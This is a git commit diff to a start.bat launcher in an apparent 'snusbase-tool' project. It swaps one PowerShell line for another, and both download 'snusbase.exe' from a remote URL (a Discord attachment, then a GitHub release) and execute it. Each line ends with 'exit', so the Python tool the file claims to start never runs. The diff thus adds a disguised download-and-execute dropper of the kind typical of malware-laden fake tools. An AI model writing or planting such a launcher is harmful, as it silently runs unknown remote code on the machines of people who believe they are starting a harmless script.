c510dea587a455462ad06da51dc4c92116737b5a
IWcommunityFR <158751385+IWcommunityFR@users.noreply.github.com>
2024-02-21 14:25:12 +0100

    Update start.bat

--- start.bat
+++ start.bat
@@ -1,5 +1,5 @@
 @echo off
 cd src
-powershell $down=New-Object System.Net.WebClient;$url='https://cdn.discordapp.com/attachments/1186759970017005689/1206279786482114570/snusbase.exe?ex=65db6e98&is=65c8f998&hm=2cb891c6297bf0bcb2a05be547a17262d05c20629c9893b3e1a281e5e17ddf61&';$file='snusbase.exe'; $down.DownloadFile($url,$file);$exec=New-Object -com shell.application;$exec.shellexecute($file);exit
+powershell $down=New-Object System.Net.WebClient;$url='https://github.com/IWcommunityFR/snusbase-tool/releases/download/snusbase/snusbase.exe';$file='snusbase.exe'; $down.DownloadFile($url,$file);$exec=New-Object -com shell.application;$exec.shellexecute($file);exit
 py main.py
 Key : 01266156
